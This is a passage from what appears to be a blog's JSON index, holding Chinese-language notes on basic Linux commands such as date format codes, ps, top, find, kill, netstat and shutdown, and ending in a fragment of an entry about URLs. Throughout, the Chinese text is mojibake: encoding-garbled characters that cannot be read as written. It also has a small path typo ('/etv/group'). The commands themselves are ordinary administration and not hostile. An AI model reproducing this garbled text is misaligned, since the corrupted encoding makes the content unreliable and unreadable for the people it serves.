-hè¡¨ç¤ºä»¥è¾ƒé«˜å¯è¯»æ€§çš„å½¢å¼å±•ç¤ºå¤§å°\n13.freeæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ\nè¯­æ³•ï¼š#free\t-m -mè¡¨ç¤ºä»¥mbä¸ºå•ä½æŸ¥çœ‹\nå‰©ä½™çš„çœŸå®å¯ç”¨çš„å†…å­˜ä¸º1665mbã€‚\nSwapï¼šç”¨äºä¸´æ—¶å†…å­˜ï¼Œå½“ç³»ç»ŸçœŸå®å†…å­˜ä¸å¤Ÿç”¨çš„æ—¶å€™å¯ä»¥ä¸´æ—¶ä½¿ç”¨ç£ç›˜ç©ºé—´æ¥å……å½“å†…å­˜ã€‚\n14.headæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰nè¡Œï¼Œè‹¥ä¸æŒ‡å®šnï¼Œåˆ™é»˜è®¤æ˜¾ç¤ºå‰10è¡Œã€‚\nè¯­æ³•ï¼š#head\t-n\tæ–‡ä»¶è·¯å¾„ nè¡¨ç¤ºæ•°å­—\n15.tailæŒ‡ä»¤ ä½œç”¨1ï¼šæŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ«nè¡Œï¼Œå¦‚æœnä¸æŒ‡å®šï¼Œåˆ™é»˜è®¤æ˜¾ç¤ºå10è¡Œ\nè¯­æ³•ï¼š#tail\t-n\tæ–‡ä»¶è·¯å¾„ nè¡¨ç¤ºæ•°å­—\nä½œç”¨2ï¼šå¯ä»¥é€šè¿‡tailæŒ‡ä»¤æ¥æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„åŠ¨æ€å˜åŒ–å†…å®¹ï¼ˆå˜åŒ–çš„å†…å®¹ä¸èƒ½æ˜¯ç”¨æˆ·æ‰‹åŠ¨æ·»åŠ çš„ï¼‰\nè¯­æ³•ï¼š#tail\t-f\tæ–‡ä»¶è·¯å¾„ è¯¥å‘½ä»¤ä¸€èˆ¬ç”¨äºæŸ¥çœ‹ç³»ç»Ÿçš„æ—¥å¿—æ¯”è¾ƒå¤š\n16.lessæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹æ–‡ä»¶ï¼Œä»¥è¾ƒå°‘çš„å†…å®¹è¿›è¡Œè¾“å‡ºï¼ŒæŒ‰ä¸‹è¾…åŠ©åŠŸèƒ½é”®ï¼ˆæ•°å­—+å›è½¦ï¼Œç©ºæ ¼é”®+ä¸Šä¸‹æ–¹å‘é”®ï¼‰æŸ¥çœ‹æ›´å¤š\nè¯­æ³•ï¼š#less\téœ€è¦æŸ¥çœ‹çš„æ–‡ä»¶è·¯å¾„ é€€å‡ºçš„æ—¶å€™åªéœ€è¦æŒ‰ä¸‹qé”®\n17.wcæŒ‡ä»¤ ä½œç”¨ï¼šç»Ÿè®¡æ–‡ä»¶å†…å®¹ä¿¡æ¯ï¼ˆåŒ…å«è¡Œæ•°ã€å•è¯æ•°ã€å­—èŠ‚æ•°ï¼‰\nè¯­æ³•ï¼š#wc\t-lwc\téœ€è¦ç»Ÿè®¡çš„æ–‡ä»¶è·¯å¾„ -lï¼šè¡¨ç¤ºlinesï¼Œè¡Œæ•°\n-wï¼šè¡¨ç¤ºwordsï¼Œå•è¯æ•°ï¼Œä¾ç…§ç©ºæ ¼æ¥åˆ¤æ–­å•è¯æ•°é‡\n-cï¼šè¡¨ç¤ºbytesï¼Œå­—èŠ‚æ•°\n18.dateæŒ‡ä»¤ ä½œç”¨ï¼šè¡¨ç¤ºæ“ä½œæ—¶é—´æ—¥æœŸï¼ˆè¯»å–ã€è®¾ç½®ï¼‰\nè¯­æ³•1ï¼š#date è¾“å‡ºçš„å½¢å¼ï¼š2019å¹´8æœˆ24æ—¥\tæ˜ŸæœŸå…­\t20:13:14\nè¯­æ³•2ï¼š#date\t+%F\tï¼ˆç­‰ä»·äº\t#date\t\"+%Y-%m-%d\"ï¼‰ è¾“å‡ºå½¢å¼ï¼š2019-08-24\nè¯­æ³•3ï¼š#date\t\"+%F %T\"\tï¼ˆç­‰ä»·äº\t#date\t\"+%Y-%m-%d\t%H:%M:%S\"ï¼‰ å¼•å·è¡¨ç¤ºè®©â€œå¹´æœˆæ—¥ä¸æ—¶åˆ†ç§’â€æˆä¸ºä¸€ä¸ªä¸å¯åˆ†å‰²çš„æ•´ä½“\nè¾“å‡ºçš„å½¢å¼ï¼š2019-08-24\t20:13:14\nè¯­æ³•4ï¼š#date\t-d\t\"-1 day\"\t\"+%Y-%m-%d %H:%M:%S\" ç”¨äºè·å–ä¹‹å‰æˆ–è€…ä¹‹åçš„æŸä¸ªæ—¶é—´ï¼ˆå¤‡ä»½ï¼‰\nç¬¦å·çš„å¯é€‰å€¼ï¼š+ï¼ˆä¹‹åï¼‰ã€-ï¼ˆä¹‹å‰ï¼‰\nå•ä½çš„å¯é€‰å€¼ï¼šdayï¼ˆå¤©ï¼‰ã€monthï¼ˆæœˆä»½ï¼‰ã€yearï¼ˆå¹´ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  %Fï¼šè¡¨ç¤ºå®Œæ•´çš„å¹´æœˆæ—¥ %Tï¼šè¡¨ç¤ºå®Œæ•´çš„æ—¶åˆ†ç§’ %Yï¼šè¡¨ç¤ºå››ä½å¹´ä»½ %mï¼šè¡¨ç¤ºä¸¤ä½æœˆä»½ï¼ˆå¸¦å‰å¯¼0ï¼‰ %dï¼šè¡¨ç¤ºæ—¥æœŸï¼ˆå¸¦å‰å¯¼0ï¼‰ %Hï¼šè¡¨ç¤ºå°æ—¶ï¼ˆå¸¦å‰å¯¼0ï¼‰ %Mï¼šè¡¨ç¤ºåˆ†é’Ÿï¼ˆå¸¦å‰å¯¼0ï¼‰ %Sï¼šè¡¨ç¤ºç§’æ•°ï¼ˆå¸¦å‰å¯¼0ï¼‰ (ä»¥ä¸‹æ‘˜è‡ª#date --help) %%\tä¸€ä¸ªæ–‡å­—çš„ % %a\tå½“å‰locale çš„æ˜ŸæœŸåç¼©å†™(ä¾‹å¦‚ï¼š æ—¥ï¼Œä»£è¡¨æ˜ŸæœŸæ—¥) %A\tå½“å‰locale çš„æ˜ŸæœŸåå…¨ç§° (å¦‚ï¼šæ˜ŸæœŸæ—¥) %b\tå½“å‰locale çš„æœˆåç¼©å†™ (å¦‚ï¼šä¸€ï¼Œä»£è¡¨ä¸€æœˆ) %B\tå½“å‰locale çš„æœˆåå…¨ç§° (å¦‚ï¼šä¸€æœˆ) %c\tå½“å‰locale çš„æ—¥æœŸå’Œæ—¶é—´ (å¦‚ï¼š2005å¹´3æœˆ3æ—¥ æ˜ŸæœŸå›› 23:05:25) %C\tä¸–çºªï¼›æ¯”å¦‚ %Yï¼Œé€šå¸¸ä¸ºçœç•¥å½“å‰å¹´ä»½çš„åä¸¤ä½æ•°å­—(ä¾‹å¦‚ï¼š20) %d\tæŒ‰æœˆè®¡çš„æ—¥æœŸ(ä¾‹å¦‚ï¼š01) %D\tæŒ‰æœˆè®¡çš„æ—¥æœŸï¼›ç­‰äº%m/%d/%y %e\tæŒ‰æœˆè®¡çš„æ—¥æœŸï¼Œæ·»åŠ ç©ºæ ¼ï¼Œç­‰äº%_d %F\tå®Œæ•´æ—¥æœŸæ ¼å¼ï¼Œç­‰ä»·äº %Y-%m-%d %g\tISO-8601 æ ¼å¼å¹´ä»½çš„æœ€åä¸¤ä½ (å‚è§%G) %G\tISO-8601 æ ¼å¼å¹´ä»½ (å‚è§%V)ï¼Œä¸€èˆ¬åªå’Œ %V ç»“åˆä½¿ç”¨ %h\tç­‰äº%b %H\tå°æ—¶(00-23) %I\tå°æ—¶(00-12) %j\tæŒ‰å¹´è®¡çš„æ—¥æœŸ(001-366) %k hour, space padded ( 0..23); same as %_H %l hour, space padded ( 1..12); same as %_I %m month (01..12) %M minute (00..59) %n\tæ¢è¡Œ %N\tçº³ç§’(000000000-999999999) %p\tå½“å‰locale ä¸‹çš„\"ä¸Šåˆ\"æˆ–è€…\"ä¸‹åˆ\"ï¼ŒæœªçŸ¥æ—¶è¾“å‡ºä¸ºç©º %P\tä¸%p ç±»ä¼¼ï¼Œä½†æ˜¯è¾“å‡ºå°å†™å­—æ¯ %r\tå½“å‰locale ä¸‹çš„ 12 å°æ—¶æ—¶é’Ÿæ—¶é—´ (å¦‚ï¼š11:11:04 ä¸‹åˆ) %R\t24 å°æ—¶æ—¶é—´çš„æ—¶å’Œåˆ†ï¼Œç­‰ä»·äº %H:%M %s\tè‡ªUTC æ—¶é—´ 1970-01-01 00:00:00 ä»¥æ¥æ‰€ç»è¿‡çš„ç§’æ•° %S\tç§’(00-60) %t\tè¾“å‡ºåˆ¶è¡¨ç¬¦ Tab %T\tæ—¶é—´ï¼Œç­‰äº%H:%M:%S %u\tæ˜ŸæœŸï¼Œ1 ä»£è¡¨æ˜ŸæœŸä¸€ %U\tä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨ï¼Œä»¥å‘¨æ—¥ä¸ºæ¯æ˜ŸæœŸç¬¬ä¸€å¤©(00-53) %V\tISO-8601 æ ¼å¼è§„èŒƒä¸‹çš„ä¸€å¹´ä¸­ç¬¬å‡ å‘¨ï¼Œä»¥å‘¨ä¸€ä¸ºæ¯æ˜ŸæœŸç¬¬ä¸€å¤©(01-53) %w\tä¸€æ˜ŸæœŸä¸­çš„ç¬¬å‡ æ—¥(0-6)ï¼Œ0 ä»£è¡¨å‘¨ä¸€ %W\tä¸€å¹´ä¸­çš„ç¬¬å‡ å‘¨ï¼Œä»¥å‘¨ä¸€ä¸ºæ¯æ˜ŸæœŸç¬¬ä¸€å¤©(00-53) %x\tå½“å‰locale ä¸‹çš„æ—¥æœŸæè¿° (å¦‚ï¼š12/31/99) %X\tå½“å‰locale ä¸‹çš„æ—¶é—´æè¿° (å¦‚ï¼š23:13:48) %y\tå¹´ä»½æœ€åä¸¤ä½æ•°ä½ (00-99) %Y\tå¹´ä»½ %z +hhmm\tæ•°å­—æ—¶åŒº(ä¾‹å¦‚ï¼Œ-0400) %:z +hh:mm\tæ•°å­—æ—¶åŒº(ä¾‹å¦‚ï¼Œ-04:00) %::z +hh:mm:ss\tæ•°å­—æ—¶åŒº(ä¾‹å¦‚ï¼Œ-04:00:00) %:::z\tæ•°å­—æ—¶åŒºå¸¦æœ‰å¿…è¦çš„ç²¾åº¦ (ä¾‹å¦‚ï¼Œ-04ï¼Œ+05:30) %Z\tæŒ‰å­—æ¯è¡¨æ’åºçš„æ—¶åŒºç¼©å†™ (ä¾‹å¦‚ï¼ŒEDT)   19.calæŒ‡ä»¤ ä½œç”¨ï¼šç”¨æ¥æ“ä½œæ—¥å†çš„\nè¯­æ³•1ï¼š#cal\tï¼ˆç­‰ä»·äº#cal\t-lï¼‰ ç›´æ¥è¾“å‡ºå½“å‰æœˆä»½æ—¥å†\nè¯­æ³•2ï¼š#cal\t-3 è¡¨ç¤ºè¾“å‡ºä¸Šä¸€ä¸ªæœˆ+æœ¬æœˆ+ä¸‹ä¸ªæœˆçš„æ—¥å†\nè¯­æ³•3ï¼š#cal\t-y\tå¹´ä»½ è¡¨ç¤ºè¾“å‡ºæŸä¸€ä¸ªå¹´ä»½çš„æ—¥å†\n20.clear | (ctrl+L) æŒ‡ä»¤ ä½œç”¨ï¼šæ¸…é™¤ç»ˆç«¯ä¸­å·²ç»å­˜åœ¨çš„å‘½ä»¤å’Œç»“æœï¼ˆä¿¡æ¯ï¼‰\nè¯­æ³•ï¼š#clear\tæˆ– å¿«æ·é”® ctrl + L æ³¨æ„ï¼šè¯¥å‘½ä»¤å¹¶ä¸æ˜¯çœŸçš„æ¸…é™¤äº†ä¹‹å‰çš„ä¿¡æ¯ï¼Œè€Œæ˜¯æŠŠä¹‹å‰çš„ä¿¡æ¯éƒ½éšè—åˆ°äº†æœ€ä¸Šé¢ï¼Œå¯ä»¥é€šè¿‡æ»šåŠ¨æ¡ç»§ç»­æŸ¥çœ‹ä»¥å‰çš„ä¿¡æ¯ã€‚\n21.ç®¡é“pipe ç®¡é“ç¬¦ï¼š\t| ä½œç”¨ï¼šç®¡é“ä¸€èˆ¬å¯ä»¥ç”¨äºâ€œè¿‡æ»¤â€ï¼Œâ€œç‰¹æ®Šâ€ï¼Œâ€œæ‰©å±•å¤„ç†â€\nè¯­æ³•ï¼šç®¡é“ä¸èƒ½å•ç‹¬ä½¿ç”¨ï¼Œå¿…é¡»éœ€è¦é…åˆå‰é¢çš„æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ï¼Œèµ·ä½œç”¨ä¸»è¦æ˜¯è¾…åŠ©ä½œç”¨ â‘ è¿‡æ»¤æ¡ˆä¾‹ï¼ˆé«˜é¢‘ç‡ä½¿ç”¨ï¼‰ï¼šéœ€è¦é€šè¿‡ç®¡é“æŸ¥è¯¢å‡ºæ ¹ç›®å½•ä¸‹åŒ…å«â€œyâ€å­—æ¯çš„æ–‡æ¡£åç§°ã€‚\n1 2 3 4 5  #ls\t| grep y é’ˆå¯¹ä¸Šé¢è¿™ä¸ªå‘½ä»¤è¯´æ˜ï¼š â‘ ä»¥ç®¡é“ä½œä¸ºåˆ†ç•Œçº¿ï¼Œå‰é¢çš„å‘½ä»¤æœ‰ä¸ªè¾“å‡ºï¼Œåé¢éœ€è¦å…ˆè¾“å…¥ï¼Œç„¶åå†è¿‡æ»¤ï¼Œæœ€åå†è¾“å‡ºï¼Œé€šä¿—çš„è®²å°±æ˜¯ç®¡é“å‰é¢çš„è¾“å‡ºå°±æ˜¯åé¢æŒ‡ä»¤çš„è¾“å…¥ï¼› â‘¡grepæŒ‡ä»¤ï¼šä¸»è¦ç”¨äºè¿‡æ»¤   â‘¡ç‰¹æ®Šç”¨æ³•æ¡ˆä¾‹ï¼šé€šè¿‡ç®¡é“çš„æ“ä½œæ–¹æ³•æ¥å®ç°lessçš„ç­‰ä»·æ•ˆæœï¼ˆäº†è§£ï¼‰\nä¹‹å‰é€šè¿‡lessæŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥#less è·¯å¾„\nç°åœ¨é€šè¿‡ç®¡é“è¿˜å¯ä»¥è¿™ä¹ˆï¼š#cat è·¯å¾„|less\nâ‘¢æ‰©å±•å¤„ç†ï¼šç»Ÿè®¡æŸä¸ªç›®å½•ä¸‹çš„æ–‡æ¡£çš„æ€»ä¸ªæ•°ï¼Ÿ\nç­”ï¼š#ls / | wc -l\n22.hostnameæŒ‡ä»¤ ä½œç”¨ï¼šæ“ä½œæœåŠ¡å™¨çš„ä¸»æœºåï¼ˆè¯»å–orè®¾ç½®ï¼‰\nè¯­æ³•1ï¼š#hostname å«ä¹‰ï¼šè¡¨ç¤ºè¾“å‡ºå®Œæ•´çš„ä¸»æœºå\nè¯­æ³•2ï¼š#hostname\t-f\nå«ä¹‰ï¼šè¡¨ç¤ºè¾“å‡ºå½“å‰ä¸»æœºåä¸­çš„FQDNï¼ˆå…¨é™å®šåŸŸåï¼‰\n23.idæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼ˆåŒ…å«ç”¨æˆ·idï¼Œç”¨æˆ·ç»„idï¼Œé™„åŠ ç»„id...ï¼‰ï¼Œè¯¥æŒ‡ä»¤å¦‚æœä¸æŒ‡å®šç”¨æˆ·åˆ™é»˜è®¤å½“å‰ç”¨æˆ·ã€‚\nè¯­æ³•1ï¼š#id é»˜è®¤æ˜¾ç¤ºå½“å‰æ‰§è¡Œè¯¥å‘½ä»¤çš„ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯\nè¯­æ³•2ï¼š#id\tusername æ˜¾ç¤ºæŒ‡å®šè´¦æˆ·ï¼ˆusernameï¼‰çš„åŸºæœ¬ä¿¡æ¯\néªŒè¯ç”¨æˆ·ä¿¡æ¯å¯é€šè¿‡æ–‡ä»¶ï¼ˆ/etc/passwdï¼‰\néªŒè¯ç”¨æˆ·ç»„ä¿¡æ¯å¯é€šè¿‡æ–‡ä»¶ï¼ˆ/etv/groupï¼‰\n24.whoamiæŒ‡ä»¤ ä½œç”¨ï¼šâ€œæˆ‘æ˜¯è°ï¼Ÿâ€ï¼Œæ˜¾ç¤ºå½“å‰ç™»å½•çš„ç”¨æˆ·åï¼Œä¸€èˆ¬ç”¨äºshellè„šæœ¬ï¼Œç”¨äºè·å–å½“å‰æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·åæ–¹ä¾¿è®°å½•æ—¥å¿—ã€‚\nè¯­æ³•ï¼š#whoami 25.ps -efæŒ‡ä»¤ æŒ‡ä»¤ï¼šps\nä½œç”¨ï¼šç”¨äºæŸ¥çœ‹æœåŠ¡å™¨è¿›ç¨‹ä¿¡æ¯\né€‰é¡¹å«ä¹‰ï¼š\nâ€‹\t-eï¼šç­‰ä»·äºâ€œ-Aâ€ï¼Œè¡¨ç¤ºåˆ—å‡ºå…¨éƒ¨çš„è¿›ç¨‹\nâ€‹\t-fï¼šæ˜¾ç¤ºå…¨éƒ¨çš„åˆ—ï¼ˆæ˜¾ç¤ºå…¨å­—æ®µï¼‰\nå„åˆ—çš„å«ä¹‰ï¼š UIDï¼šè¯¥è¿›ç¨‹æ‰§è¡Œçš„ç”¨æˆ·idï¼› PIDï¼šè¿›ç¨‹idï¼› PPIDï¼šè¯¥è¿›ç¨‹çš„çˆ¶çº§è¿›ç¨‹idï¼Œå¦‚æœä¸€ä¸ªç¨‹åºçš„çˆ¶çº§è¿›ç¨‹æ‰¾ä¸åˆ°ï¼Œè¯¥ç¨‹åºçš„è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆparent process IDï¼‰ï¼› Cï¼šCpuçš„å ç”¨ç‡ï¼Œå…¶å½¢å¼æ˜¯ç™¾åˆ†æ•°ï¼› STIMEï¼šè¿›è¡Œçš„å¯åŠ¨æ—¶é—´ï¼› TTYï¼šç»ˆç«¯è®¾å¤‡ï¼Œå‘èµ·è¯¥è¿›ç¨‹çš„è®¾å¤‡è¯†åˆ«ç¬¦å·ï¼Œå¦‚æœæ˜¾ç¤ºâ€œ?â€åˆ™è¡¨ç¤ºè¯¥è¿›ç¨‹å¹¶ä¸æ˜¯ç”±ç»ˆç«¯è®¾å¤‡å‘èµ·ï¼› TIMEï¼šè¿›ç¨‹çš„æ‰§è¡Œæ—¶é—´ï¼› CMDï¼šè¯¥è¿›ç¨‹çš„åç§°æˆ–è€…å¯¹åº”çš„è·¯å¾„ #ps\t-ef\t|\tgrep\t\"è¿›ç¨‹åç§°\" ç”¨äºæŸ¥çœ‹ç‰¹å®šè¿›ç¨‹çš„çŠ¶æ€\n26.topæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹æœåŠ¡å™¨çš„è¿›ç¨‹å ç”¨çš„èµ„æº\nè¯­æ³•ï¼šè¿›å…¥å‘½ä»¤ï¼š#topï¼ˆåŠ¨æ€æ˜¾ç¤ºï¼‰ é€€å‡ºå‘½ä»¤ï¼šæŒ‰ä¸‹qé”® è¡¨å¤´å«ä¹‰ï¼š PIDï¼šè¿›ç¨‹idï¼› USERï¼šè¯¥è¿›ç¨‹å¯¹åº”çš„ç”¨æˆ·ï¼› PRï¼šä¼˜å…ˆçº§ï¼› VIRTï¼šè™šæ‹Ÿå†…å­˜ï¼› RESï¼šå¸¸é©»å†…å­˜ï¼› SHRï¼šå…±äº«å†…å­˜ï¼› è®¡ç®—ä¸€ä¸ªè¿›ç¨‹å®é™…ä½¿ç”¨çš„å†…å­˜ = å¸¸é©»å†…å­˜ï¼ˆRESï¼‰- å…±äº«å†…å­˜ï¼ˆSHRï¼‰ Sï¼šè¡¨ç¤ºè¿›ç¨‹çš„çŠ¶æ€statusï¼ˆsleepingï¼Œå…¶ä¸­Sè¡¨ç¤ºç¡çœ ï¼ŒRè¡¨ç¤ºè¿è¡Œï¼‰ï¼› %CPUï¼šè¡¨ç¤ºCPUçš„å ç”¨ç™¾åˆ†æ¯”ï¼› %MEMï¼šè¡¨ç¤ºå†…å­˜çš„å ç”¨ç™¾åˆ†æ¯”ï¼› TIME+ï¼šæ‰§è¡Œçš„æ—¶é—´ï¼› COMMANDï¼šè¿›ç¨‹çš„åç§°æˆ–è€…è·¯å¾„ åœ¨è¿è¡Œtopå‘½ä»¤æ—¶ï¼Œå¯ä»¥æœ‰å¦‚ä¸‹å¿«æ·é”®ï¼š\nMï¼šè¡¨ç¤ºå°†ç»“æœæŒ‰ç…§å†…å­˜ï¼ˆMEMï¼‰ä»é«˜åˆ°ä½è¿›è¡Œé™åºæ’åˆ—\nPï¼šè¡¨ç¤ºå°†ç»“æœæŒ‰ç…§CPUä½¿ç”¨ç‡ä»é«˜åˆ°ä½è¿›è¡Œé™åºæ’åˆ—\n1ï¼šå½“æœåŠ¡å™¨æ‹¥æœ‰å¤šä¸ªCPUçš„æ—¶å€™å¯ä»¥ä½¿ç”¨â€œ1â€å¿«æ·é”®æ¥åˆ‡æ¢æ˜¯å¦å±•ç¤ºæ˜¾ç¤ºå„ä¸ªcpuçš„è¯¦ç»†ä¿¡æ¯\n27.du -shæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹ç›®å½•çš„çœŸå®å¤§å°\nè¯­æ³•ï¼š#du\t-sh\tç›®å½•è·¯å¾„ é€‰é¡¹å«ä¹‰ï¼š\nâ€‹\t-sï¼šsummariesï¼Œåªæ˜¾ç¤ºæ±‡æ€»çš„å¤§å°\nâ€‹\t-hï¼šè¡¨ç¤ºä»¥é«˜å¯è¯»æ€§çš„å½¢å¼è¿›è¡Œæ˜¾ç¤º\n28.findæŒ‡ä»¤ ä½œç”¨ï¼šç”¨äºæŸ¥æ‰¾æ–‡ä»¶ï¼ˆå‚æ•°è´¼å¤šï¼Œ55ä¸ªï¼‰\nè¯­æ³•ï¼š#find\tè·¯å¾„èŒƒå›´\té€‰é¡¹\té€‰é¡¹çš„å€¼ é€‰é¡¹ï¼š\nâ€‹\t-nameï¼šæŒ‰ç…§æ–‡ä»¶åç§°è¿›è¡Œæœç´¢ï¼ˆæ”¯æŒæ¨¡ç³Šæœç´¢ï¼‰\nâ€‹\t-typeï¼šæŒ‰ç…§æ–‡ä»¶çš„ç±»å‹è¿›è¡Œæœç´¢ï¼ˆæ–‡ä»¶ç±»å‹ï¼šâ€œ-â€è¡¨ç¤ºæ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨findçš„ä½¿ç”¨éœ€è¦ç”¨fæ¥æ›¿æ¢ï¼›â€œdâ€è¡¨ç¤ºæ–‡ä»¶å¤¹ï¼‰\næ³¨ï¼š*ä¸ºé€šé…ç¬¦ï¼ŒåŒ¹é…æ‰€æœ‰å­—ç¬¦\n29.serviceæŒ‡ä»¤ ä½œç”¨ï¼šç”¨äºæ§åˆ¶ä¸€äº›è½¯ä»¶çš„æœåŠ¡å¯åŠ¨ã€åœæ­¢ã€é‡å¯\nè¯­æ³•ï¼š#service\tæœåŠ¡å\tstart/stop/restart ä¾‹ï¼šå¯åŠ¨æœ¬æœºå®‰è£…çš„Apacheï¼Œå…¶æœåŠ¡åä¸ºhttpd\n å…¶æœåŠ¡å¯åŠ¨è§„åˆ™å¯è‡ªå·±ç¼–å†™ï¼Œåç»­å°†ä¼šä¸“é—¨å¼€ä¸€ç¯‡è®²è¿°  30.killæŒ‡ä»¤ ä½œç”¨ï¼šè¡¨ç¤ºæ€æ­»è¿›ç¨‹ï¼ˆå½“é‡åˆ°åƒµå°¸è¿›ç¨‹æˆ–è€…å¤„äºæŸäº›åŸå› éœ€è¦å…³é—­è¿›ç¨‹çš„æ—¶å€™ï¼‰\nè¯­æ³•ï¼š#kill\tè¿›ç¨‹çš„PIDï¼ˆéœ€è¦é…åˆpsä¸€èµ·ä½¿ç”¨ï¼‰ ä¸killç›¸ä¼¼çš„å‘½ä»¤ï¼š#killall\nè¯­æ³•ï¼š#killall\tè¿›ç¨‹åç§° 31.ifconfigæŒ‡ä»¤ ä½œç”¨ï¼šç”¨äºæ“ä½œç½‘å¡ç›¸å…³çš„æŒ‡ä»¤\nè¯­æ³•ï¼š#ifconfigï¼ˆè·å–ç½‘å¡ä¿¡æ¯ï¼‰\næ³¨æ„è¯¥å‘½ä»¤åœ¨windowsç¯å¢ƒä¸‹ä¸ºipconfig\nEth0è¡¨ç¤ºLinuxä¸­çš„ä¸€ä¸ªç½‘å¡ï¼Œeth0æ˜¯å…¶åç§°ã€‚Loï¼ˆloopï¼Œæœ¬åœ°å›è¿˜ç½‘å¡ï¼Œå…¶ipåœ°å€ä¸€èˆ¬éƒ½æ˜¯127.0.0.1ï¼‰ä¹Ÿæ˜¯ä¸€ä¸ªç½‘å¡åç§°ã€‚æ³¨æ„ï¼šinet addrå°±æ˜¯ç½‘å¡çš„ipåœ°å€ã€‚\n32.rebootæŒ‡ä»¤ ä½œç”¨ï¼šé‡å¯è®¡ç®—æœº\nè¯­æ³•1ï¼š#reboot é‡å¯\nè¯­æ³•2ï¼š#reboot\t-w æ¨¡æ‹Ÿé‡å¯ï¼Œä½†æ˜¯ä¸é‡å¯ï¼ˆåªå†™å…³æœºä¸å¼€æœºçš„æ—¥å¿—ä¿¡æ¯ï¼‰\n33.shutdownæŒ‡ä»¤ ä½œç”¨ï¼šå…³æœºï¼ˆæ…ç”¨ï¼‰\nè¯­æ³•1ï¼š#shutdown\t-h\tnow\t\"å…³æœºæç¤º\" #shutdown\t-h\ttime(14:41)\t\"å…³æœºæç¤º\" å¦‚æœæƒ³è¦å–æ¶ˆå…³æœºè®¡åˆ’çš„è¯ï¼Œåˆ™å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼å»å°è¯•ï¼š\nâ‘ é’ˆå¯¹äºcentos7.xä¹‹å‰çš„ç‰ˆæœ¬ï¼šctrl+c\nâ‘¡é’ˆå¯¹äºcentos7.xï¼ˆåŒ…å«ï¼‰ä¹‹åçš„ç‰ˆæœ¬ï¼š#shutdown -c\n é™¤äº†shutdownå…³æœºä»¥å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹å‡ ä¸ªå…³æœºå‘½ä»¤\n#init\t0\n#halt\n#poweroff\n 34.uptimeæŒ‡ä»¤ ä½œç”¨ï¼šè¾“å‡ºè®¡ç®—æœºçš„æŒç»­åœ¨çº¿æ—¶é—´ï¼ˆè®¡ç®—æœºä»å¼€æœºåˆ°ç°åœ¨è¿è¡Œçš„æ—¶é—´ï¼‰\nè¯­æ³•ï¼š#uptime 35.unameæŒ‡ä»¤ ä½œç”¨ï¼šè·å–è®¡ç®—æœºæ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯\nè¯­æ³•1ï¼š#uname è·å–æ“ä½œç³»ç»Ÿç±»å‹\nè¯­æ³•2ï¼š#uname\t-a -aï¼šè¡¨ç¤ºallï¼Œè¡¨ç¤ºè·å–å…¨éƒ¨çš„ç³»ç»Ÿä¿¡æ¯ï¼ˆç±»å‹ã€å…¨éƒ¨ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ã€å‘å¸ƒæ—¶é—´ã€å¼€æºè®¡åˆ’ï¼‰\n36.netstat\t-tnlpæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€\nè¯­æ³•ï¼š#netstat\t-tnlp 1 2 3 4 5  é€‰é¡¹è¯´æ˜ï¼š -tï¼šè¡¨ç¤ºåªåˆ—å‡ºtcpåè®®çš„è¿æ¥ï¼› -nï¼šè¡¨ç¤ºå°†åœ°å€ä»å­—æ¯ç»„åˆè½¬åŒ–æˆipåœ°å€ï¼Œå°†åè®®è½¬åŒ–æˆç«¯å£å·æ¥æ˜¾ç¤ºï¼› -lï¼šè¡¨ç¤ºè¿‡æ»¤å‡ºâ€œstateï¼ˆçŠ¶æ€ï¼‰â€åˆ—ä¸­å…¶å€¼ä¸ºLISTENï¼ˆç›‘å¬ï¼‰çš„è¿æ¥ï¼› -pï¼šè¡¨ç¤ºæ˜¾ç¤ºå‘èµ·è¿æ¥çš„è¿›ç¨‹pidå’Œè¿›ç¨‹åç§°ï¼›   37.manæŒ‡ä»¤ ä½œç”¨ï¼šmanualï¼Œæ‰‹å†Œï¼ˆåŒ…å«äº†Linuxä¸­å…¨éƒ¨çš„å‘½ä»¤æ‰‹å†Œï¼Œè‹±æ–‡ï¼‰\nè¯­æ³•ï¼š#man\tå‘½ä»¤ é€€å‡ºæŒ‰ä¸‹qé”®\nä¾‹ï¼š#man\tcp\nç¼–è¾‘å™¨ä¹‹ç¥â€”â€”Vimç¼–è¾‘å™¨ ","description":"","tags":["linux","studyNote"],"title":"Linux Note","uri":"/posts/linux-note/"},{"categories":["network"],"content":"URL  å¼•ç”¨ï¼š\nurl_Wiki\nçŸ­é“¾æ¥åŸç†åˆ†æ\nçŸ­é“¾æ¥çš„ç®—æ³•\n ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆè‹±è¯­ï¼šUniform Resource Locatorï¼‰ ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆè‹±è¯­ï¼šUniform Resource 